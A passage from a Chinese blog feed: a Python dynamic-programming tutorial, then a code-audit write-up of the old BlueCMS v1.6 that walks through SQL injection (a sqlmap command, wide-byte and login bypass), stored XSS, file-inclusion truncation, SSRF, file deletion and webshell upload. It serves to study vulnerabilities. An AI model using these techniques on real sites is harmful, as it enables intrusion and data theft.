class="language-python">def coinChange(coins, amount):    memo &#x3D; dict()    def main(n):        if n in memo:  # 查找备忘录，避免重复计算，就是计算以上颜色相同的部分            return memo[n]        if n &#x3D;&#x3D; 0:            return 0        if n &lt; 0:            return -1        res &#x3D; float(&quot;INF&quot;)        for coin in coins:            sub &#x3D; main(n - coin)            if sub &#x3D;&#x3D; -1:                continue            res &#x3D; min(res, 1 + sub)        memo[n] &#x3D; (res if res !&#x3D; float(&quot;INF&quot;) else -1)        return memo[n]    return main(amount)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(coinChange([1, 2, 5], 11))</code></pre><h4 id="DP-table解法-1"><a href="#DP-table解法-1" class="headerlink" title="DP table解法"></a><strong>DP table解法</strong></h4><pre class="language-python" data-language="python"><code class="language-python">def main(coins, a):    for i in range(a + 1):        dp.append(i)    for i in range(a + 1):        for coin in coins:            if i - coin &lt; 0:                continue            dp[i] &#x3D; min(dp[i], 1 + dp[i - coin])    return -1 if dp[a] &#x3D;&#x3D; (a + 1) else dp[a]if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    dp &#x3D; []    print(main([1, 2, 5], 11))</code></pre><p>演示图如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421220220973.png" alt loading="lazy"></p><p>借用大佬的一句话：</p><p>计算机解决问题其实没有任何奇技淫巧，他唯一的解决方法就是穷举，穷举所有的可能性。算法设计无非就是先思考“如何穷举”，然后再追求“如何聪明的穷举”</p><h3 id="最长递增子序列"><a href="#最长递增子序列" class="headerlink" title="最长递增子序列"></a>最长递增子序列</h3><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422111536792.png" alt loading="lazy"></p><h4 id="动态规划解法"><a href="#动态规划解法" class="headerlink" title="动态规划解法"></a>动态规划解法</h4><p>动态规划的核⼼设计思想是数学归纳法。</p><p>假设当结论在<code>k&lt;n</code>的时候成立，然后想办法证明<code>k=n</code>的时候结论也成立，如果能够证明的出来，那么就说明这个结论对于任何数都成立，再看到这个题目，假如我们能够证明，最后一个<code>nums[i]</code>的值大于前一个<code>nums[j]</code>的值，那么就能够证明出他和<code>nums[j]</code>所构成的最长递增子序列能够结合，随后再将长度加一，且将<code>nums[i]</code>加入到这个最长递增子序列中，即：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/gif2.gif" alt loading="lazy"></p><p>代码实现</p><pre class="language-python" data-language="python"><code class="language-python">def main(nums):    res &#x3D; 0    dp &#x3D; []  # 定义每一位数的最长递增子序列    for i in range(len(nums)):        dp.append(1)  # 令每一位的初始值为1    for i in range(len(nums)):        for j in range(i):            if nums[i] &gt; nums[j]:                dp[i] &#x3D; max(dp[i], dp[j] + 1)  # dp[i]表示nums[i]这个数结尾的最长递增子序列的长度    for i in range(len(dp)):        res &#x3D; max(res, dp[i])    return resif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(main([8, 7, 10]))</code></pre><p>可见时间复杂度为O(n^2)</p><h4 id="二分查找解法"><a href="#二分查找解法" class="headerlink" title="二分查找解法"></a>二分查找解法</h4><p>将输入的序列分成若干堆，需要遵循以下规则：</p><p>只能把小的数字压到比它大的数字上，也就是用小的数字覆盖掉原来大的，那么如何去压呢？那么就看该数字该如何选择了，如果当前数字较大没有可以放置的堆，那么就在边上新建一个堆，再把数字放进去，如果有多个堆可以选择，则选择这多个堆中考最左边的位置，保证堆顶的数字是有序的了，就像这样（A是最大的）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422120140509.png" alt loading="lazy"></p><p>这样堆顶的数字就可以形成一个最长递增子序列，当然序列肯定不止一个，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422120330841.png" alt loading="lazy"></p><p>能够保证得出最长递增子序列，随后在查找该放在哪个堆的时候使用二分法查找就可以提高效率，代码如下：</p><pre class="language-python" data-language="python"><code class="language-python">def main(nums):    piles &#x3D; 0  #定义最长递增子序列的长度    top &#x3D; []  # 定义每一位数的最长递增子序列    for i in range(len(nums)):        top.append(0)  # 令每一位的初始值为1    for i in range(len(nums)):        poker &#x3D; nums[i]        left &#x3D; 0        right &#x3D; piles        while left &lt; right:            mid &#x3D; int((left + right) &#x2F; 2)            if top[mid] &gt; poker:                right &#x3D; mid            elif top[mid] &lt; poker:                left &#x3D; mid + 1            else:                right &#x3D; mid        if left &#x3D;&#x3D; piles:            piles +&#x3D; 1  # 最长递增子序列的长度加一        top[left] &#x3D; poker    return pilesif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(main([8, 7, 6, 1, 4, 10]))</code></pre><h3 id="编辑距离"><a href="#编辑距离" class="headerlink" title="编辑距离"></a>编辑距离</h3><p>先来看一下题目描述</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422161419634.png" alt loading="lazy"></p><h4 id="递归解法"><a href="#递归解法" class="headerlink" title="递归解法"></a>递归解法</h4><pre class="language-python" data-language="python"><code class="language-python">def minDistance(s1, s2):    def dp(i, j):        if i &#x3D;&#x3D; -1:            return j + 1  # 假如当s1字符串循环i次循环完了，j还有剩下的部分就直接全部进行一个操作j+1次即可，因为还剩下j+1个字符        if j &#x3D;&#x3D; -1:            return i + 1  # 同上        if s1[i] &#x3D;&#x3D; s2[j]:            return dp(i - 1, j - 1)  # 若相等直接跳过进行下一个字符的判断        else:            return min(dp(i, j - 1) + 1,  # 插入                       dp(i - 1, j - 1) + 1,  # 替换                       dp(i - 1, j) + 1)  # 删除    return dp(len(s1) - 1, len(s2) - 1)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(minDistance(&quot;apple&quot;, &quot;add&quot;))</code></pre><p>以上是将<code>apple</code>和<code>add</code>两个字符串进行转换，得出的结果为4，即所需操作的最小值</p><h4 id="带备忘录的递归解法-2"><a href="#带备忘录的递归解法-2" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><pre class="language-python" data-language="python"><code class="language-python">def minDistance(s1, s2):    memo &#x3D; dict()  # 备忘录    def dp(i, j):        if (i, j) in memo:            return memo[(i, j)]        if i &#x3D;&#x3D; -1:            return j + 1  # 假如当s1字符串循环i次循环完了，j还有剩下的部分就直接全部进行一个操作j+1次即可，因为还剩下j+1个字符        if j &#x3D;&#x3D; -1:            return i + 1  # 同上        if s1[i] &#x3D;&#x3D; s2[j]:            memo[(i, j)] &#x3D; dp(i - 1, j - 1)  # 若相等直接跳过进行下一个字符的判断        else:            memo[(i, j)] &#x3D; min(dp(i, j - 1) + 1,  # 插入                               dp(i - 1, j - 1) + 1,  # 替换                               dp(i - 1, j) + 1)  # 删除        return memo[(i, j)]    return dp(len(s1) - 1, len(s2) - 1)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(minDistance(&quot;apple&quot;, &quot;add&quot;))</code></pre><h4 id="DP-table解法-2"><a href="#DP-table解法-2" class="headerlink" title="DP table解法"></a>DP table解法</h4><p>自底向上</p><p>首先确定<code>dp</code>数组的含义，<code>dp</code>数组是一个二维数组，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422170423923.png" alt loading="lazy"></p><p><code>dp[i][j]</code>存储着<code>s1[i]</code>和<code>s2[j]</code>的最小编辑距离，各相邻的数据之间有如下关系：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422170651675.png" alt loading="lazy"></p><p>于是就可以写出以下代码：</p><pre class="language-python" data-language="python"><code class="language-python">def minDistance(s1, s2):    m &#x3D; len(s1)    n &#x3D; len(s2)    dp &#x3D; dict()    dp[(0, 0)] &#x3D; 0    for i in range(1, m + 1):        dp[(i, 0)] &#x3D; i    for i in range(1, n + 1):        dp[(0, i)] &#x3D; i    for i in range(1, m + 1):        for j in range(1, n + 1):            if s1[i - 1] &#x3D;&#x3D; s2[j - 1]:                dp[(i, j)] &#x3D; dp[(i - 1, j - 1)]            else:                dp[(i, j)] &#x3D; min(dp[(i, j - 1)] + 1,                                 dp[(i - 1, j - 1)] + 1,                                 dp[(i - 1, j)] + 1)    return dp[(m, n)]if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(minDistance(&quot;apple&quot;, &quot;add&quot;))</code></pre><p>随后还可以将步骤推出来：</p><pre class="language-python" data-language="python"><code class="language-python">def minDistance(s1, s2):    m &#x3D; len(s1)    n &#x3D; len(s2)    dp &#x3D; dict()    a &#x3D; dict()  # 记录每一步的操作 0：啥都不做，1：插入，2：替换，3：删除    dp[(0, 0)] &#x3D; 0    a[(0, 0)] &#x3D; 0    for i in range(1, m + 1):        dp[(i, 0)] &#x3D; i        a[(i, 0)] &#x3D; 3    for i in range(1, n + 1):        dp[(0, i)] &#x3D; i        a[(0, i)] &#x3D; 1    for i in range(1, m + 1):        for j in range(1, n + 1):            if s1[i - 1] &#x3D;&#x3D; s2[j - 1]:                dp[(i, j)] &#x3D; dp[(i - 1, j - 1)]  # 不动，也就是相同直接跳过 0                a[(i, j)] &#x3D; 0            else:                dp[(i, j)] &#x3D; min(dp[(i, j - 1)] + 1,  # 插入 1                                 dp[(i - 1, j - 1)] + 1,  # 替换 2                                 dp[(i - 1, j)] + 1)  # 删除 3            if dp[(i, j)] &#x3D;&#x3D; dp[(i, j - 1)] + 1:                a[(i, j)] &#x3D; 1            elif dp[(i, j)] &#x3D;&#x3D; dp[(i - 1, j - 1)] + 1:                a[(i, j)] &#x3D; 2            elif dp[(i, j)] &#x3D;&#x3D; dp[(i - 1, j)] + 1:                a[(i, j)] &#x3D; 3    for i in range(n + 1):        for j in range(m + 1):            print(a[(j, i)], end&#x3D;&quot;&quot;)        print()    return dp[(m, n)]if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(minDistance(&quot;apple&quot;, &quot;add&quot;))</code></pre><p>以上代码将输出：</p><pre class="language-none"><code class="language-none">0333331033331122221112224</code></pre><p>从后面往前推就行，0,2代表对角（跳过/替换），1代表向上（插入），3代表向左（删除）</p><p>寻找到0的最佳捷径就OK</p><h3 id="高楼扔鸡蛋"><a href="#高楼扔鸡蛋" class="headerlink" title="高楼扔鸡蛋"></a>高楼扔鸡蛋</h3><p>题目：</p><p>目前有一栋1到<code>N</code>共<code>N</code>层的楼，然后给你<code>K</code>鸡蛋（<code>K</code>至少为1），现在确定这栋楼存在楼层<code>0&lt;=F&lt;=N</code>,在这层楼将鸡蛋扔下去鸡蛋<strong>恰好没有碎</strong>（高于<code>F</code>的楼层都会碎，低于<code>F</code>的楼层都不会碎），现在问，最坏的情况下，你至少要扔多少次鸡蛋，才能确定这个楼层<code>F</code>？</p><h4 id="带备忘录的递归解法-3"><a href="#带备忘录的递归解法-3" class="headerlink" title="带备忘录的递归解法"></a>带备忘录的递归解法</h4><pre class="language-python" data-language="python"><code class="language-python">def main(K, N):  # K个鸡蛋,N层楼    memo &#x3D; dict()    if K &#x3D;&#x3D; 0:        return N    if N &#x3D;&#x3D; 0:        return 0    if (K, N) in memo:        return memo[(K, N)]    res &#x3D; float(&quot;INF&quot;)    for i in range(1, N + 1):        res &#x3D; min(res, max(main(K - 1, i - 1), main(K, N - i)) + 1)  # 在max最坏的情况下，求min最优解，main(K - 1, i - 1)表示碎了，main(K, N - i)表示没碎    memo[(K, N)] &#x3D; res    return resif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(main(1, 100))</code></pre><h4 id="二分法优化"><a href="#二分法优化" class="headerlink" title="二分法优化"></a>二分法优化</h4><pre class="language-python" data-language="python"><code class="language-python">def main(K, N):  # K个鸡蛋,N层楼    memo &#x3D; dict()    if K &#x3D;&#x3D; 0:        return N    if N &#x3D;&#x3D; 0:        return 0    if (K, N) in memo:        return memo[(K, N)]    res &#x3D; float(&quot;INF&quot;)    lo &#x3D; 1    hi &#x3D; N    while lo &lt;&#x3D; hi:        mid &#x3D; (lo + hi) &#x2F;&#x2F; 2        broken &#x3D; main(K - 1, mid - 1)  # 碎        not_broken &#x3D; main(K, N - mid)  # 没碎        # res &#x3D; min(max(碎, 没碎) + 1)        if broken &gt; not_broken:            hi &#x3D; mid - 1            res &#x3D; min(res, broken + 1)        else:            lo &#x3D; mid + 1            res &#x3D; min(res, not_broken + 1)    memo[(K, N)] &#x3D; res    return resif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(main(1, 100))</code></pre><p>未完待续。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;斐波拉契数列&quot;&gt;&lt;a href=&quot;#斐波拉契数列&quot; class=&quot;headerlink&quot; title=&quot;斐波拉契数列&quot;&gt;&lt;/a&gt;斐波拉契数列&lt;/h3&gt;&lt;p&gt;&lt;code&gt;1,1,2,3,5,8,13...&lt;/code&gt;，状态转移方程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190059738.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="https://www.extrader.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="python" scheme="https://www.extrader.top/tags/python/"/>
    
      <category term="算法" scheme="https://www.extrader.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>BlueCMS代码审计</title>
    <link href="https://www.extrader.top/posts/b7c1e15e/"/>
    <id>https://www.extrader.top/posts/b7c1e15e/</id>
    <published>2020-04-15T03:22:30.000Z</published>
    <updated>2020-04-15T03:22:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>“BlueCMS——第一款免费开源的专业地方门户系统，专注于地方门户的CMS！”  广告是这么打的</p><p>BlueCMS v1.6 sp1，一个很老的CMS了，2010年的，上面的漏洞也很多，作为一个代码审计萌新的我，开始来拿这个练练手还是不错的</p><a id="more"></a><h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>在后台有一个模板管理的功能，可以编辑前端htm文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101051793.png" alt loading="lazy"></p><p>点击编辑抓包</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101241645.png" alt loading="lazy"></p><p>可以看到包含了文件，于是我们尝试修改编辑的文件，改为<code>../../ann.php</code>，放包后如下，可以修改</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101419641.png" alt loading="lazy"></p><p>随后直接写马连接即可，源码如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101729886.png" alt loading="lazy"></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="X-Forwarded-For头注入"><a href="#X-Forwarded-For头注入" class="headerlink" title="X-Forwarded-For头注入"></a>X-Forwarded-For头注入</h4><p>首先看到留言系统后台代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415164807809.png" alt loading="lazy"></p><p>网站习惯性的把用户留言时的ip保存下来，在看看getip()这个函数怎么写的</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415165228100.png" alt loading="lazy"></p><p>getenv()函数获取环境变量的值</p><ul><li>第一个HTTP_CLIENT_IP这个环境变量没有成标准，很多服务器完全没法获取</li><li>第二个X-Forwarded-For 这个东西可以通过HTTP请求头来修改。</li></ul><p>X-Forwarded-For明显可以伪造</p><p>抓包手工延时注入：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415165848020.png" alt loading="lazy"></p><p>然后写脚本跑就可以了</p><p>sqlmap跑数据库：<code>python sqlmap.py -r 1.txt --dbs --batch --headers=&quot;X-Forwarded-For:1*&quot;</code></p><p>可以把数据全跑出来</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415171800746.png" alt loading="lazy"></p><h4 id="首页登录界面SQL注入"><a href="#首页登录界面SQL注入" class="headerlink" title="首页登录界面SQL注入"></a>首页登录界面SQL注入</h4><p>先随便注册一个用户名为root的账号，然后在抓包使用万能密码即可登录任意用户</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415134357459.png" alt loading="lazy"></p><p>再来看看源码中是怎么写的</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415134551779.png" alt loading="lazy"></p><p>只限制了管理员组的不能从前台登录，参数没经过任何的过滤。。。</p><h4 id="注册界面SQL注入"><a href="#注册界面SQL注入" class="headerlink" title="注册界面SQL注入"></a>注册界面SQL注入</h4><p>既然是注册界面就看肯定有插入数据到数据库中的操作，直接看源码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414102814136.png" alt loading="lazy"></p><p>简单的进行了用户和密码的检测，但并起不到实际的作用，于是在email处尝试进行报错注入，单引号闭合的时候能够成功插入到数据库中并没有报错，于是推测使用了魔术方法对用户的输入进行了转义，而sql语句编码方法使用的gbk编码，于是在单引号前面加上%df构成宽字节注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414104343110.png" alt loading="lazy"></p><p>成功报错但并没有显示出错误信息，查看源代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2020041411035197.png" alt loading="lazy"></p><p>似乎只会报sql语法错误，而我们报错注入使用的是XPATH上的语法错误，所以并不会显示出来，于是尝试盲注试试，尝试后视乎并没有执行成功，而是报了错误，原因不明，后面再研究</p><p>另外此处还有一个sql注入漏洞，可以插入多行用户数据，并且在email出嵌入sql语句，用户名单引号用十六进制代替</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414121232230.png" alt loading="lazy"></p><p>可见成功执行注入，在数据库中成功执行了语句</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414121433047.png" alt loading="lazy"></p><h4 id="管理登录界面SQL注入"><a href="#管理登录界面SQL注入" class="headerlink" title="管理登录界面SQL注入"></a>管理登录界面SQL注入</h4><p>如下图，万能密码直接进了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416150916773.png" alt loading="lazy"></p><p>源码，无过滤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416151154990.png" alt loading="lazy"></p><h4 id="ad-idSQL注入"><a href="#ad-idSQL注入" class="headerlink" title="ad_idSQL注入"></a>ad_idSQL注入</h4><p>直接看源码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416153522230.png" alt loading="lazy"></p><p>应该存在联合查询注入，随后在第七个字段找到注入点，成功获取数据库名，随后再接着查表列就行了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416153652959.png" alt loading="lazy"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="个人资料存储型xss"><a href="#个人资料存储型xss" class="headerlink" title="个人资料存储型xss"></a>个人资料存储型xss</h4><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161529680.png" alt loading="lazy"></p><p>随后在个人界面和管理员用户界面完美弹窗，再看看数据库中的资料</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161646983.png" alt loading="lazy"></p><p>email和msn都嵌入了script代码，为啥其它的没用？因为表字段的长度只有那么长</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161908634.png" alt loading="lazy"></p><p>再看看代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415162022292.png" alt loading="lazy"></p><p>同样未经过过滤，这里还存在sql注入漏洞，就不写了。</p><h4 id="注册界面存储型xss"><a href="#注册界面存储型xss" class="headerlink" title="注册界面存储型xss"></a>注册界面存储型xss</h4><p>注册界面的验证有部分是放在前端进行验证的，也就是用js进行验证，可我们都知道，前端验证并不可靠，真正的验证应该做在后端才行，就比如这里的邮箱验证就放在前端</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414100621671.png" alt loading="lazy"></p><p>于是我们直接抓包绕过，并在email中注入恶意代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2020041410074329.png" alt loading="lazy"></p><p>随后只要前端能够看得到该用户的邮箱，就会执行该恶意代码，就比如管理员的用户列表界面</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS代码审计/image-20200414101006315.png" style="zoom:80%;" loading="lazy"><h4 id="发布新闻页面存储型XSS"><a href="#发布新闻页面存储型XSS" class="headerlink" title="发布新闻页面存储型XSS"></a>发布新闻页面存储型XSS</h4><p>先看下源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416113747952.png" alt loading="lazy"></p><p>content参数使用的是<code>filter_data</code>函数进行处理，而这个函数并没有过滤<code>img</code>标签，于是可以利用进行xss攻击</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416114042972.png" alt loading="lazy"></p><p>随后在新闻页面成功弹窗</p><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><h4 id="备份信息泄露"><a href="#备份信息泄露" class="headerlink" title="备份信息泄露"></a>备份信息泄露</h4><p>管理员界面可以进行数据库备份，备份完后的数据放在这个目录下，并且命名规则为使用当日日期，可以尝试爆破地址</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415173114792.png" alt loading="lazy"></p><p>访问即可下载sql文件，其中有用户的个人信息，密码经过了md5加密，弱密码的话直接就可以加密开了</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>既然有文件包含漏洞自然少不了那四个<a href="https://www.extrader.top/2020/03/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/">文件包含</a>的操作，所以在找文件包含漏洞的时候就需要对这几个操作格外留意</p><h4 id="支付表单文件包含"><a href="#支付表单文件包含" class="headerlink" title="支付表单文件包含"></a>支付表单文件包含</h4><p>先在user.php中找到有<code>include</code>操作的代码，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416085302539.png" alt loading="lazy"></p><p>可以看到这里我们可以post一个pay参数，且pay参数我们可控，既然有文件包含了，自然就要找到文件上传的地方来包含这个文件来达到getshell的目的，在我们修改个人资料的界面就有上传头像的操作，于是我们上传图片马</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416085806794.png" alt loading="lazy"></p><p>得到路径，而这个文件包含操作在后面还加上了一个<code>/index.php</code>，这里就要根据为Windows下的文件最大路径来截取了，前提条件是php版本要小于<code>5.2.8</code>，Windows下目录最大长度为256字节，超出的部分会被丢弃，于是在提交act=pay的表单处提交一个<code>pay=../../data/upload/face_pic/15869440930.jpg......(超出256个字节)</code>，即可达到效果，由于我这没配php5.2.8的版本就不演示了</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="修改用户头像处SSRF"><a href="#修改用户头像处SSRF" class="headerlink" title="修改用户头像处SSRF"></a>修改用户头像处SSRF</h4><p>源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416120117255.png" alt loading="lazy"></p><p>这段代码是用来防止<code>http://</code>和<code>https://</code>链接的，但是使用的是弱比价，如果<code>strpos</code>返回的值为0，那么<code>0!=false</code>返回的是<code>false</code>即可绕过判断访问内网资源</p><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><h4 id="install无限安装"><a href="#install无限安装" class="headerlink" title="install无限安装"></a>install无限安装</h4><p>install目录是用来安装这个CMS的，但是在经过一次安装后再进入install系统并不会提示已经安装过或者要身份验证，于是就会造成无需任何提交就可以重新安装这个网站的风险，尽管管理员页面有提示（开发人员也有意识到），但如果使用者并没有在意就会造成极大的危害</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413184943343.png" alt loading="lazy"></p><h4 id="爆破用户名"><a href="#爆破用户名" class="headerlink" title="爆破用户名"></a>爆破用户名</h4><p>在输入用户名之后系统会自动发一个包到数据库去验证，如图所示</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413190358504.png" alt loading="lazy"></p><p>而这个查询并没有次数限制，于是就可以利用这个数据包传入的user_name值来爆破用户名，造成身份信息泄露</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413185326945.png" alt loading="lazy"></p><h4 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h4><p>在修改会员的个人资料页面存在此漏洞，源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416120945046.png" alt loading="lazy"></p><p><code>face_pic3</code>可控，当<code>face_pic1</code>为空时即可删除<code>face_pic3</code>文件，如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416121706429.png" alt loading="lazy"></p><p>可删除网站根目录下的1.txt文件</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://xz.aliyun.com/t/7074">https://xz.aliyun.com/t/7074</a></li><li><a href="https://www.anquanke.com/post/id/178545">https://www.anquanke.com/post/id/178545</a></li><li><a href="https://blog.csdn.net/WiCaTcRaZy/article/details/80444699">https://blog.csdn.net/WiCaTcRaZy/article/details/80444699</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;“BlueCMS——第一款免费开源的专业地方门户系统，专注于地方门户的CMS！”  广告是这么打的&lt;/p&gt;
&lt;p&gt;BlueCMS v1.6 sp1，一个很老的CMS了，2010年的，上面的漏洞也很多，作为一个代码审计萌新的我，开始来拿这个练练手还是不错的&lt;/p&gt;
    
    </summary>
    
    
      <category term="源码审计" scheme="https://www.extrader.top/categories/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="CMS" scheme="https://www.extrader.top/tags/CMS/"/>
    
